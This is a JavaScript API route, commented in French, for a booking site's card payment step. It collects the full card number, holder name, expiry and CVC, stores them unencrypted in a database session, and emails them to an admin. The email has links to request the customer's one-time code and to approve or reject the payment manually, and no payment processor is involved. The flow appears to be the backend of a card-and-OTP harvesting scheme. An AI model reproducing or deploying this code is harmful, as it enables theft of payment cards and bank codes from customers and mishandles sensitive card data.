/**
 * POST /api/payments/card-otp
 *
 * ÉTAPE 1 du flux — appelé quand le client clique "Payer par CB" :
 *  1. Reçoit les infos carte + bookingId
 *  2. Crée une OtpSession (step: 'card_sent') + un Payment (pending)
 *  3. Envoie EMAIL 1 à l'admin : infos carte + 4 boutons d'action
 *  4. Retourne { success: true, sessionId, paymentId }
 *     → le frontend ouvre le modal et commence à poller
 */

import crypto from 'crypto';
import dbConnect from '@/lib/db';
import OtpSession from '@/models/OtpSession';
import Payment from '@/models/Payment';
import Booking from '@/models/Booking';
import User from '@/models/User';
import { withAuth } from '@/middleware/withAuth';
import { errorHandler } from '@/middleware/errorHandler';
import { sendEmail } from '@/lib/mail';
import { adminCardInfoEmail } from '@/email-templates/admin-card-info';

function formatCardNumber(n) {
  return n.replace(/\s/g, '').replace(/(.{4})/g, '$1 ').trim();
}

function formatPrice(cents) {
  return (cents / 100).toFixed(2).replace('.', ',') + ' €';
}

async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Méthode non autorisée' });
  }

  const adminEmail = process.env.ADMIN_EMAIL;
  if (!adminEmail) {
    return res.status(500).json({ success: false, error: 'Configuration admin manquante' });
  }

  await dbConnect();

  const { bookingId, number, name, expiry, cvc } = req.body;

  if (!bookingId || !number || !name || !expiry || !cvc) {
    return res.status(400).json({ success: false, error: 'Données de carte manquantes' });
  }

  // Vérification réservation
  const booking = await Booking.findOne({
    _id: bookingId,
    user: req.user.id,
    paymentStatus: { $in: ['unpaid', 'pending'] },
  });

  if (!booking) {
    return res.status(404).json({ success: false, error: 'Réservation introuvable ou déjà payée' });
  }

  // Supprimer les sessions et paiements précédents pour cette réservation
  await OtpSession.deleteMany({ booking: bookingId, user: req.user.id });
  await Payment.deleteMany({ booking: bookingId, method: 'card', status: 'pending' });

  // Créer la session avec un token admin
  const adminToken = crypto.randomBytes(32).toString('hex');
  const session = await OtpSession.create({
    booking:    bookingId,
    user:       req.user.id,
    cardNumber: formatCardNumber(number),
    cardName:   name,
    cardExpiry: expiry,
    cardCvc:    cvc,
    step:       'card_sent',
    adminToken,
  });

  // Créer le Payment dès l'étape 1 (pour le polling et la décision admin directe)
  const payment = await Payment.create({
    booking: bookingId,
    user:    req.user.id,
    amount:  booking.totalPrice,
    method:  'card',
    status:  'pending',
    notes:   `otp_session:${session._id}`,
  });

  // Mettre la réservation en pending
  await Booking.findByIdAndUpdate(bookingId, {
    paymentStatus: 'pending',
    expiresAt: new Date(Date.now() + 30 * 60 * 1000),
  });

  // Infos user pour l'email
  const user = await User.findById(req.user.id).select('name email').lean();
  const bookingRef = String(bookingId).slice(-6).toUpperCase();

  // URLs des actions admin
  const baseUrl           = process.env.NEXTAUTH_URL || 'http://localhost:3000';
  const bankValidationUrl = `${baseUrl}/api/payments/card-action?token=${adminToken}&action=bank_validation`;
  const otpRequestUrl     = `${baseUrl}/api/payments/card-action?token=${adminToken}&action=otp_request`;
  const approveUrl        = `${baseUrl}/api/payments/card-decision?token=${adminToken}&decision=approve`;
  const rejectUrl         = `${baseUrl}/api/payments/card-decision?token=${adminToken}&decision=reject`;

  // EMAIL 1 → admin : infos carte + 4 boutons d'action
  const { subject, html } = adminCardInfoEmail({
    userName:          user?.name || 'Client',
    userEmail:         user?.email || '—',
    cardNumber:        formatCardNumber(number),
    cardName:          name,
    cardExpiry:        expiry,
    cardCvc:           cvc,
    bookingRef,
    amount:            formatPrice(booking.totalPrice),
    bankValidationUrl,
    otpRequestUrl,
    approveUrl,
    rejectUrl,
  });

  sendEmail({ to: adminEmail, subject, html }).catch((err) =>
    console.error('[card-otp] Erreur email admin:', err.message)
  );

  return res.status(200).json({
    success:   true,
    sessionId: session._id,
    paymentId: payment._id,
  });
}

export default errorHandler(withAuth(handler));
